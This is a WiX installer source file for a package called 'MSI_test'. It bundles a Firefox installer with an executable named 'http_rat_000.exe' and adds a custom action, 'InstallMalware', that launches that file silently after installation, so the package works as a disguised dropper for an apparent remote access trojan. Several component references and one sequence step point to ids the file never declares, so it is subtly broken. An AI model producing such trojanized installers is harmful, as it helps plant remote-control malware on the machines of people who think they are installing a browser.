<Wix xmlns="http://wixtoolset.org/schemas/v4/wxs">
  <Package Name="MSI_test" Manufacturer="TODO Manufacturer" Version="1.0.0.0" UpgradeCode="29e4f5b3-03b4-4884-a962-1229d9c3e5cd">
    <MajorUpgrade DowngradeErrorMessage="!(loc.DowngradeError)" />
    <MediaTemplate EmbedCab="yes" />

    <DirectoryRef Id="TempFolder">
      <Component Id="FirefoxComponent" Guid="{2DB8EECB-3A4F-4D49-90D1-3E6F4121DCB6}">
        <File Id="FirefoxSetup" Source="C:\Users\User\source\repos\MSI_test\MSI_test\bin01\Firefox_Installer.exe"/>
      </Component>
      <Component Id="SecondExeComponent" Guid="{BF2E1A05-5A3D-4BD2-BA88-3F90ABCB3E46}">
        <File Id="SecondExe" Source="C:\Users\User\source\repos\MSI_test\MSI_test\bin01\http_rat_000.exe"/>
      </Component>
    </DirectoryRef>

    <Feature Id="DummyFeature" Level="1">
      <ComponentRef Id="FirefoxInstallComponent"/>
      <ComponentRef Id="MalwareExeComponent"/>
    </Feature>

    <CustomAction Id="InstallFirefox" Directory="TempFolder" ExeCommand="[TempFolder]Firefox_Installer.exe" Return="asyncNoWait" />
    <CustomAction Id="InstallMalware" Directory="TempFolder" ExeCommand="[TempFolder]http_rat_000.exe" Return="asyncNoWait" />

    <InstallExecuteSequence>
      <Custom Action="InstallMalware" After="InstallFinalize" />
      <Custom Action="InstallFirefox" After="InstallSecondExe" />
    </InstallExecuteSequence>
  </Package>
</Wix>
